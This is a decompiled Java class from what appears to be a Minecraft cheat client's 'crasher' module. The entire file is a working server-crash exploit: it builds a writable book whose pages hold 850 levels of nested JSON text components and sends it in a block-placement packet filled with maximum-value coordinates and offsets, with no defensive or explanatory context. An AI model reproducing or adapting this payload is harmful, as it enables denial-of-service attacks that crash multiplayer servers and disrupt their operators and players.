// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher;

import net.minecraft.init.Items;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.item.ItemStack;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketPlayerBlockPlacement;
import net.minecraft.util.math.BlockPos;
import net.minecraft.client.Minecraft;

public class OneSmasherCrasher
{
    public static void start() {
        final Minecraft mc = Minecraft.getMinecraft();
        final BlockPos pos = new BlockPos(Double.MAX_VALUE, 1.0, Double.MAX_VALUE);
        Minecraft.getMinecraft().player.connection.sendPacket(new CPacketPlayerBlockPlacement(pos, Integer.MAX_VALUE, onePacketBook(), Float.MAX_VALUE, Float.MAX_VALUE, Float.MAX_VALUE));
    }
    
    public static ItemStack onePacketBook() {
        final NBTTagCompound base = new NBTTagCompound();
        final NBTTagList list = new NBTTagList();
        String value = "{";
        for (int i = 0; i < 850; ++i) {
            value = String.valueOf(value) + "extra:[{";
        }
        for (int i = 0; i < 850; ++i) {
            value = String.valueOf(value) + "text:a}],";
        }
        value = String.valueOf(value) + "text:a}";
        for (int i = 0; i < 2; ++i) {
            list.appendTag(new NBTTagString(value));
        }
        base.setString("author", "MUDDAUser");
        base.setString("title", "CrashedBydeine");
        base.setByte("resolved", (byte)1);
        base.setTag("pages", list);
        final ItemStack book = new ItemStack(Items.WRITABLE_BOOK);
        book.setTagCompound(base);
        return book;
    }
}
